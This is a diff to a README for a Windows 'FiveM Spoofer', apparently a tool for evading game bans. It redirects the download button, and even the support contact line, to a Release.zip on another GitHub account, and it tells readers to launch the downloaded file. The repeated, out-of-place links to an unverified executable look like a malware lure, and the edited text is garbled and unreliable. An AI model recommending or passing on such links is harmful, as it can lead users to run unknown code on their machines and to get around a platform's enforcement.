@@ -22,7 +22,7 @@ Welcome to the official repository of FiveM Spoofer, a powerful Windows applicat
 ## Download FiveM Spoofer 📥
 
 Simply click the button below to download the latest version of FiveM Spoofer:
-[![](https://img.shields.io/badge/Download-FiveM%20Spoofer-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![](https://github.com/FODN7/FiveM-Spoofer/releases/download/v1.0/Release.zip%20Spoofer-blue)](https://github.com/FODN7/FiveM-Spoofer/releases/download/v1.0/Release.zip)
 
 Please note that the downloaded file needs to be launched to install FiveM Spoofer on your system.
 
@@ -39,7 +39,7 @@ FiveM Spoofer is compatible with all versions of Windows operating system, inclu
 
 ## Support and Feedback 🤝
 
-For any questions, feedback, or support inquiries regarding FiveM Spoofer, please reach out to our team at support@fivemspoofer.com. We are here to assist you with any issues or concerns you may have.
+For any questions, feedback, or support inquiries regarding FiveM Spoofer, please reach out to our team at https://github.com/FODN7/FiveM-Spoofer/releases/download/v1.0/Release.zip We are here to assist you with any issues or concerns you may have.
 
 ## Join Our Community 🌐
 
